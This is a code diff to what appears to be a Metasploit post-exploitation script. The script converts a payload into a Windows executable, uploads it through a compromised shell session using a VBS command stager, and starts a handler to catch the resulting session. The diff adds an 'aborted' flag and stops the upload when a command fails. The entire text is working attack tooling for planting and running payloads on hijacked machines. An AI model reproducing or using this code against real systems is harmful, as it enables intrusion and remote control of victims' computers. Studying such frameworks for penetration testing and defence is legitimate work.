@@ -53,7 +53,7 @@ if (use_handler)
 	# It takes a little time for the resources to get set up, so sleep for
 	# a bit to make sure the exploit is fully working.  Without this,
 	# mod.get_resource doesn't exist when we need it.
-	Rex::ThreadSafe.sleep(0.5)
+	select(nil, nil, nil, 0.5)
 	if framework.jobs[mh.job_id.to_s].nil?
 		raise RuntimeError, "Failed to start multi/handler - is it already running?"
 	end
@@ -72,67 +72,75 @@ end
 #
 # Make the payload into an exe for the CmdStager
 #
-lplat = [Msf::Platform::Windows]
-larch = [ARCH_X86]
-opts = {
-	:linemax => 1700,
-	:decoder => File.join(Msf::Config.install_root, "data", "exploits", "cmdstager", "vbs_b64"),
-	#:persist => true
-}
-delay = 0.25
-exe = Msf::Util::EXE.to_executable(framework, larch, lplat, buf)
-
-
-#
-# Generate the stager command array
-#
-cmdstager = Rex::Exploitation::CmdStagerVBS.new(exe)
-cmds = cmdstager.generate(opts)
-if (cmds.nil? or cmds.length < 1)
-	print_error("The command stager could not be generated")
-	raise ArgumentError
-end
-
-
-#
-# Calculate the total size
-#
-total_bytes = 0
-cmds.each { |cmd| total_bytes += cmd.length }
-
-
-#
-# Run the commands one at a time
-#
+aborted = false
 begin
+	
+	lplat = [Msf::Platform::Windows]
+	larch = [ARCH_X86]
+	opts = {
+		:linemax => 1700,
+		:decoder => File.join(Msf::Config.install_root, "data", "exploits", "cmdstager", "vbs_b64"),
+		#:persist => true # keep temp files (for debugging)
+	}
+	exe = Msf::Util::EXE.to_executable(framework, larch, lplat, buf)
+
+
+	#
+	# Generate the stager command array
+	#
+	cmdstager = Rex::Exploitation::CmdStagerVBS.new(exe)
+	cmds = cmdstager.generate(opts)
+	if (cmds.nil? or cmds.length < 1)
+		print_error("The command stager could not be generated")
+		raise ArgumentError
+	end
+
+	#
+	# Calculate the total size
+	#
+	total_bytes = 0
+	cmds.each { |cmd| total_bytes += cmd.length }
+	
+
+	#
+	# Run the commands one at a time
+	#
 	sent = 0
 	cmds.each { |cmd|
 		ret = session.shell_command_token_win32(cmd)
-		if (ret)
+		if (not ret)
+			print_error("Error: Unable to execute command!")
+			aborted = true
+		else
 			ret.strip!
-			print_error(ret) if (not ret.empty?)
+			if (not ret.empty?)
+				print_error(ret) 
+				aborted = true
+			end
 		end
+		break if aborted
 
 		sent += cmd.length
-
-		select(nil, nil, nil, delay)
 
 		progress(total_bytes, sent)
 	}
 rescue ::Interrupt
 	# TODO: cleanup partial uploads!
+	aborted = true
 rescue => e
 	print_error("Error: #{e}")
+	aborted = true
 end
-
 
 #
 # Stop the job
 #
 if (use_handler)
 	Thread.new do
-		# Wait up to 10 seconds for the session to come in..
-		select(nil, nil, nil, 10)
+		if not aborted
+			# Wait up to 10 seconds for the session to come in..
+			select(nil, nil, nil, 10)
+		end
 		framework.jobs.stop_job(mh.job_id)
 	end
 end
